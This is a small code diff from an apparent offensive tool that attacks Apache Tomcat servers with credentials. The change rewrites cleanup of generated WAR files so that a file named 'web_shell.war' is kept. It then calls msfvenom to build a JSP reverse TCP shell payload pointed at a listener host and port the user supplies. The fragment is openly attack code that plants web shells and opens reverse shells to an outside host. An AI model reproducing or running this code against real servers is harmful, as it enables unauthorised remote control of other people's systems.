@@ -224,8 +224,11 @@ class authenticated_attack(tomcat):
 
                 if response.status_code != 200:
 
-                    if os.path.exists(f"reverse/{filename}.war"):
-                        os.remove(f"reverse/{filename}.war")
+                    war_files = glob.glob("resources/*.war")
+
+                    for war_file in war_files:
+                        if not war_file == 'web_shell.war':
+                            os.remove(war_file)
 
                     subprocess.run(
                         ["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={args.lhost}", f"LPORT={args.lport}",
